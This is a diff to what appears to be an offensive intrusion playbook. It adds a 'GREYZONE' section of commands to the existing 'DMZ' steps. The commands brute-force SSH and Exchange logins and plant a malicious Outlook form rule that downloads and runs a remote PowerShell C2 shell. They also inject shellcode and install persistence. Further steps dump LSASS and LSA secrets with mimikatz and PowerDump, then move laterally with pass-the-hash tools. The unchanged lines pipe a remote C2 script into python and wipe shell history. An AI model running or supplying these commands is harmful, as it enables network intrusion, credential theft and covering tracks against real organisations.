@@ -11,7 +11,8 @@
 ###### DMZ
 ```txt
 # initial access
-proxychains hydra -L <USERDICTIONARY> -P <PASSWORDDICTIONARY> <IP> ssh -u -V;
+proxychains hydra -L ~/users.txt -P ~/passwords.txt <IP> ssh -u -V;
+ssh <USER>@<IP>
 
 # on penetration, backup C2 and proxy
 nohup curl --insecure -sv https://<IP>/c2_http_basic_server.py|python - & disown
@@ -58,4 +59,59 @@ for f in `find / -type f -name "*" 2>/dev/null`; do
   touch ${f} 2>&1> /dev/null;
 done;
 history -c && echo "" > ~/.bash_history
+```
+
+###### GREYZONE
+```txt
+# initial access
+proxychains ruler --domain <TARGET> --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose
+
+# edit /tmp/command.txt
+CreateObject("Wscript.Shell").Run "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))", 0, False
+
+# reverse shell
+proxychains ruler --email <USER>@<TARGET> form add --suffix superduper --input /tmp/command.txt --rule --send
+
+# on penetration from icmp c2
+Survey 
+InstallWMIPersistence <EventFilterName> <EventConsumerName>
+SetFallbackNetwork <PAddress> <subnetMask>
+invoke_file /tmp/socks_proxy_server.py
+
+# edit proxychains.conf
+socks4 <IP> <PORT>
+
+# maintaining access from icmp c2, migrate to explorer
+InstallPersistence 1
+InstallPersistence 2
+InstallPersistence 3
+GetProcess
+invoke_file /tmp/InjectShellcode.ps1
+msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  powershell;
+Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
+
+# downgrade for DES hash, crack DES for NTLM
+invoke_file /tmp/Get-Hash.ps1
+Get-Hash
+
+# lsass mini-dump for NTLM or plaintext
+invoke_file /tmp/Out-Minidump.ps1
+Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
+download c:\temp\lsass_<PID>.dmp 
+SecureDelete c:\temp\lsass_<PID>.dmp 
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonPasswords full
+
+# lsa secrets for NTLM
+invoke_file /tmp/Invoke-PowerDump.ps1
+Invoke-PowerDump
+
+# post exploitation
+proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;
+Bypass-4MSI
+proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;
 ```
